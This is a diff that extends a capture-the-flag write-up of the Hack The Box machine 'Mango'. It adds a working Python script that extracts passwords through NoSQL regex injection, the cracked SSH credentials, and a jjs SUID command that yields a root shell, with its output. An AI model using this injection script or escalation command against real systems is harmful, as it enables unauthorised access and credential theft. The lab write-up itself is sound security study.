@@ -1,6 +1,6 @@
 <center><h1>Mango</h1></center>
 <br>
-<center><<h2>Summary</h2></center>
+<center><h2>Summary</h2></center>
 - We see the ip does not match the name on the certificate.
 - Adding ```staging-orders.mango.htb``` to our /etc/hosts file will reveal a login page
 - With the boxes name being Mango, after trial and error I came to the conclusion that the box was running MongoDB and that I would need to exploit that
@@ -90,4 +90,72 @@ Now I forwarded that request and was greeted with a new page ```http://http://st
 
 <center><img src="/htb/mango/plantation.png"></center>
 <br>
+Now that I am authenticated with the system, I need some way to get some valid credentials so I can gain access to the system. Doing some research there is a way to extract passwords using a python script if you have the correct users. First things first was I needed to write the python script. In the end I cam up with something like this. Its not the prettiest but it gets the job done. Once you see it start print multiple '$' then then password is everything before it.
+```
+import requests
+import string
 
+username = 'admin'
+password = ''
+url = "http://staging-order.mango.htb/"
+restart = True
+headers={'content-type': 'application/json'}
+
+while restart:
+        restart = False
+
+        for character in string.printable:
+            if character not in ['*', '+', '.', '?', '|']:
+                payload = password + character
+                
+                post_data = {'username':username, 'password[$regex]':"^" + payload, 'login':'login'}
+                r = requests.post(url, data=post_data, allow_redirects=False)
+
+                if r.status_code == 302:
+                    print(payload)
+                    restart = True
+                    password = payload
+
+                    if len(password) == 20:
+                        print("\npassword: " + payload)
+                        
+                        exit(0)
+                    break
+```
+For the users I pretty much just guessed ```admin``` and ```mango```. Doing that gave me these credentials
+```
+user:mango pass:h3mXK8RhU~f{]f5H
+user:admin pass:t9KcS3>!0B#2
+```
+Using this I was able to SSH in as the user mango and then use the command ```su admin``` to change to the admin user. From there I was able to grab the user flag.
+```
+$ cat user.txt
+79bf31c6c6eb38***************
+```
+Next step was to run a linux enum script. I chose the linux smart enumeration script. Running that instantly reveals something interesting
+```
+[!] fst020 Uncommon setuid binaries........................................ yes!
+---
+/usr/bin/run-mailcap
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+Some unusual SUID binaries. Taking a look at GTFOBins shows me that ```jjs``` is vulnerable to SUID privilege escalation So thats where I am going to focus my attention. The default command they tell me to run doesnt work. It just hangs and does allow me to execute anything so I had to modify it a little bit to get it to work.
+```
+Default Command:
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
+
+Working Command:
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|bash\${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+Executing the command you see I get a root shell. The only drawback is that I am unable to see anything that I type but the commands are executed
+```
+$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|bash\${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc $@|bash${IFS}-p _ echo bash -p </dev/pts/0 >/dev/pts/0 2>/dev/pts/0').waitFor()
+bash-4.4#
+```
+So if I type ```cat /root/root.txt``` then it will output the root flag
+```
+bash-4.4# 8a8ef79a7a2fbb0**************
+```
+<br><br><br><br>
